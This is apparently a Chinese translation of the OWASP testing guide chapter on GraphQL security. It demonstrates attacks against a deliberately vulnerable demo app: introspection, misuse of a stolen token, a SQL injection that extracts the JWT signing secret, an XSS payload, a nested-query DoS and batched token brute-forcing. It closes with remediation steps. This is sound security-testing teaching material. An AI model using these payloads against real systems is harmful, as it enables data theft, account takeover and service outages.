# GraphQL测试

## 概述

GraphQL 在现代 API 中已变得非常流行。它提供了简洁性和嵌套对象支持，有助于加快开发速度。尽管每种技术都有其优势，但它也可能使应用程序面临新的攻击面。本文旨在介绍使用 GraphQL 的应用程序中常见的一些错误配置和攻击向量。部分攻击向量是 GraphQL 特有的（例如[内省查询/WSTG](#内省查询)），而部分则普遍存在于各类 API 中（例如[SQL 注入/WSTG](#sql-注入)）。

本节中的示例将基于一个易受攻击的 GraphQL 应用程序 [poc-graphql](https://github.com/righettod/poc-graphql)，该应用程序运行在一个将 `localhost:8080/GraphQL` 映射为易受攻击 GraphQL 节点的 Docker 容器中。

## 测试目标

-   评估部署的配置是否安全且满足生产环境要求。
-   针对通用攻击验证所有输入字段。
-   确保应用了适当的访问控制。

## 测试方法

测试 GraphQL 节点与其他 API 技术的测试方法差异不大。可参考以下步骤：

### 内省查询

内省查询是 GraphQL 提供的一种机制，允许您询问 GraphQL 模式支持哪些查询、可用数据类型等详细信息，这些信息对测试 GraphQL 部署至关重要。

[GraphQL 官方文档对内省功能的说明](https://graphql.org/learn/introspection/)：

> "向 GraphQL 模式询问其支持的查询信息通常非常有用。GraphQL 允许我们通过内省系统实现这一功能！"

有以下几种方法可以提取这些信息并可视化输出结果：

#### 使用原生 GraphQL 内省功能

最直接的方法是发送一个 HTTP 请求（使用个人代理），其中包含以下请求体内容，该内容节选自 [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696) 平台上的文章：

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

返回结果通常会非常冗长（此处已进行精简），其中将包含 GraphQL 部署的完整模式信息。
响应：

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

可以使用诸如 [GraphQL Voyager](https://apis.guru/graphql-voyager/) 之类的工具来更好地理解 GraphQL 端点：

![GraphQL Voyager](images/Voyager.png)\
*图 WSTG 12.1-1: GraphQL Voyager*

该工具会创建 GraphQL 模式的实体关系图（ERD）表示，使您能够更清晰地查看所测试系统的内部结构和关联。通过分析图表提取信息，例如您可以发现能够查询 Dog 表。图表还显示了 Dog 所具有的属性：

- ID
- name
- veterinary (ID)

使用此方法存在一个缺点：GraphQL Voyager 不会显示 GraphQL 所有可执行的操作。例如，上图并未列出可用的变更操作。更好的策略是同时使用 Voyager 和下面列出的其他方法之一。

#### 使用 GraphiQL

[GraphiQL](https://github.com/graphql/graphiql) 是一个基于 Web 的 GraphQL 集成开发环境。它属于 GraphQL 项目的一部分，主要用于调试或开发目的。最佳实践是禁止在生产部署中允许用户访问此工具。如果您正在测试预发布环境，则可能有权访问它，从而在处理内省查询时节省时间（当然，您也可以在 GraphiQL 界面中使用内省功能）。

GraphiQL 包含一个文档部分，该部分利用模式中的数据为正在使用的 GraphQL 实例生成文档。此文档包含数据类型、变更操作以及基本上所有可通过内省功能提取的信息。

#### 使用 GraphQL Playground

[GraphQL Playground](https://github.com/graphql/graphql-playground) 是一个 GraphQL 客户端。它可用于测试不同的查询，并将 GraphQL 集成开发环境划分为不同的工作区，通过主题分类或命名进行分组。与 GraphiQL 非常相似，Playground 可以自动为您生成文档，无需手动发送内省查询和处理响应。它还有另一个显著优势：无需依赖 GraphiQL 界面可用。您可以通过 URL 将该工具指向 GraphQL 节点，或本地使用数据文件。GraphQL Playground 可直接用于测试漏洞，因此您无需使用个人代理发送 HTTP 请求。这意味着您可以使用此工具进行简单的 GraphQL 交互和评估。对于其他更复杂的载荷，请使用个人代理。

请注意，在某些情况下，您需要在底部设置 HTTP 头部，以包含会话 ID 或其他身份验证机制。这仍然允许创建具有不同权限的多个“集成开发环境”，以验证是否存在授权问题。

![Playground1](images/Playground1.png)\
*图 WSTG 12.1-2: GraphQL Playground 高级 API 文档*

![Playground2](images/Playground2.png)\
*图 WSTG 12.1-3: GraphQL Playground API 模式*

您甚至可以下载模式文件用于 Voyager。

#### 内省功能结论

内省是一种实用工具，允许用户获取有关 GraphQL 部署的更多信息。然而，恶意用户同样可以利用此功能获取相同信息。最佳实践是限制对内省查询的访问权限，因为若完全禁用该功能可能导致某些工具或请求失效。由于 GraphQL 通常与系统的后端 API 桥接，实施严格的访问控制更为重要。

### 授权机制

内省功能是发现授权问题的首要检查点。如前所述，应限制对内省功能的访问，因其可能导致数据提取和信息收集。一旦测试人员获取了模式信息并识别出可提取的敏感数据，他们便会尝试发送不应因权限不足而被阻止的查询。GraphQL 默认不强制实施权限控制，因此需要由应用程序执行授权验证。

在前述示例中，内省查询的输出显示存在名为 `auth` 的查询。这似乎是提取 API 令牌、密码等敏感信息的潜在入口点。

![Auth GraphQL Query](images/auth1.png)\
*图 WSTG 12.1-4: GraphQL 认证查询 API*

授权实现的测试因部署环境而异，每个模式包含的敏感信息不同，因此需要聚焦不同的测试目标。

在此漏洞示例中，所有用户（包括未认证用户）均可获取数据库中列出的每位兽医的认证令牌。这些令牌可用于执行模式允许的附加操作，例如通过变更操作将任意兽医与犬只关联或解除关联——即使请求中未提供与该兽医匹配的有效认证令牌。

以下示例展示了测试人员使用非自身拥有的提取令牌，以兽医 "Benoit" 身份执行操作：

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

并且响应：

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```

列表中的所有犬只均属于 Benoit，而非认证令牌所有者。当未实施适当的授权执行机制时，就可能发生此类操作。

### 注入攻击

GraphQL 作为应用程序 API 层的实现，通常会将请求转发至后端 API 或直接访问数据库。这使得攻击者能够利用任何底层漏洞，例如 SQL 注入、命令注入、跨站脚本等。使用 GraphQL 仅改变了恶意载荷的入口点。

您可以参考 OWASP 测试指南中的其他场景以获取测试思路。

GraphQL 还支持标量类型，这些类型通常用于处理没有原生数据类型的自定义数据（如 DateTime）。此类数据缺乏开箱即用的验证机制，因此成为测试的潜在重点目标。

#### SQL 注入

示例应用程序在设计上存在漏洞，具体体现在查询 `dogs(namePrefix: String, limit: Int = 500): [Dog!]` 中，因为参数 `namePrefix` 被直接拼接到 SQL 查询语句中。拼接用户输入是应用程序中一种常见的不良实践，可能使其暴露于 SQL 注入攻击之下。

以下查询可从数据库的 `CONFIG` 表中提取信息：

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

对该查询的响应是：

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 3,
        "name": "..."
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

该查询可获取示例应用程序中用于签署 JWT 的密钥，此类信息极为敏感。
为了在任何特定应用程序中明确测试目标，收集有关应用程序构建方式及数据库表结构的信息将大有裨益。您也可使用 `sqlmap` 等工具来探测注入路径，甚至实现从数据库中自动提取数据。

#### 跨站脚本（XSS）

当攻击者注入可执行代码且该代码随后被浏览器执行时，就会发生跨站脚本攻击。有关 XSS 的测试方法，请参阅[输入验证测试/WSTG](../07-Input_Validation_Testing/README.md)章节。您可使用[反射型跨站脚本测试/WSTG](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md)中的载荷来测试反射型 XSS。

在此示例中，错误信息可能会反射用户输入，从而导致 XSS 漏洞。
载荷：

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

响应：

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

### 拒绝服务（DoS）查询

GraphQL 提供了一个非常简洁的接口，允许开发人员使用嵌套查询和嵌套对象。这种能力也可能被恶意利用，通过调用类似递归函数的深度嵌套查询，耗尽 CPU、内存或其他计算资源，从而导致拒绝服务。

回顾*图 12.1-1*，可以发现可以创建一个循环结构，其中 Dog 对象包含 Veterinary 对象。这种嵌套对象可能存在无限层级。

这使得以下深层查询有可能导致应用程序过载：

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

可通过实施多种安全措施来防范此类查询，具体方法列于[修复措施](#修复措施)章节。恶意查询可能导致 GraphQL 部署面临 DoS 等安全问题，应纳入测试范围。

### 批量处理攻击

GraphQL 支持将多个查询批量合并到单个请求中。这使用户能够高效地请求多个对象或多个对象实例。然而，攻击者可利用此功能实施批处理攻击。在单个请求中发送多个查询的示例如下：

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

在示例应用程序中，可通过发送单个请求利用可推测的ID（递增整数）提取所有兽医姓名。攻击者随后可利用这些姓名获取访问令牌。与可能被Web应用防火墙等网络安全措施或Nginx等速率限制器拦截的多次请求方式不同，这些请求可被批量处理。这意味着仅需少量请求即可实现高效的暴力破解且不易被检测。以下为示例查询：

```graphql
query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}
```

这将使攻击者获得兽医姓名，如前所述，这些姓名可用于批量请求这些兽医的认证令牌。例如：

```graphql
query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}
```

批处理攻击可用于规避网站上实施的多种安全措施。它还可用于枚举对象，并尝试暴力破解多因素认证或其他敏感信息。

### 详细错误信息

GraphQL 在运行时可能遇到意外错误。当此类错误发生时，服务器可能返回包含内部错误详情、应用程序配置或数据的错误响应。这将使恶意用户能够获取有关应用程序的更多信息。作为测试的一部分，应通过发送异常数据（即模糊测试）来检查错误消息。需要检查响应中是否可能通过此技术泄露敏感信息。

### 底层 API 暴露

GraphQL 是一项相对较新的技术，部分应用程序正从旧版 API 过渡至 GraphQL。在许多情况下，GraphQL 被部署为标准 API，负责将使用 GraphQL 语法发送的请求及其响应转换到底层 API。如果未对底层 API 的请求进行适当的授权检查，可能导致权限提升风险。

例如，包含参数 `id=1/delete` 的请求可能被解析为 `/api/users/1/delete`。这可能进一步扩展到操作用户 `user=1` 所属的其他资源。此外，请求可能被解释为具有 GraphQL 节点被授予的权限，而非真实请求者的权限。

测试人员应尝试访问底层 API 方法，因为这可能存在权限提升的可能性。

## 修复措施

-   限制对内省查询的访问权限。
-   实施输入验证。
    -   GraphQL 没有原生支持输入验证的方法，但有一个名为 ["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive) 的开源项目，允许在模式定义中加入输入验证。
    -   单独的输入验证虽有帮助，但并非完整的解决方案，还应采取额外措施来缓解注入攻击。
-   实施安全措施以防止恶意查询。
    -   **超时设置**：限制查询允许运行的时间。
    -   **最大查询深度**：限制允许的查询深度，防止过深的查询滥用资源。
    -   **设置最大查询复杂度**：限制查询的复杂度，以减轻对 GraphQL 资源的滥用。
    -   **使用基于服务器时间的节流**：限制用户可消耗的服务器时间总量。
    -   **使用基于查询复杂度的节流**：限制用户可执行的查询总复杂度。
-   **发送通用错误消息**：使用不泄露部署详情的通用错误消息。
-   缓解批处理攻击：
    -   在代码中添加对象请求速率限制。
    -   阻止对敏感对象进行批处理操作。
    -   限制单次可运行的查询数量。

有关修复 GraphQL 弱点的更多信息，请参阅 [GraphQL 速查表](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)。

## 工具

- [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL (Burp 扩展)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [GraphQL Raider (Burp 扩展)](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL (ZAP 插件)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)

## 参考文献

- [WSTG-APIT-99](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md#detailed-error-message)
- [poc-graphql](https://github.com/righettod/poc-graphql)
- [GraphQL 官方网站](https://graphql.org/learn/)
- [Howtographql - 安全](https://www.howtographql.com/advanced/4-security/)
- [GraphQL 约束指令](https://github.com/confuser/graphql-constraint-directive)
- [客户端测试](../11-Client-side_Testing/README.md)（XSS 及其他漏洞）
- [5 种常见的 GraphQL 安全漏洞](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [GraphQL 常见漏洞及其利用方法](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [GraphQL 速查表](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
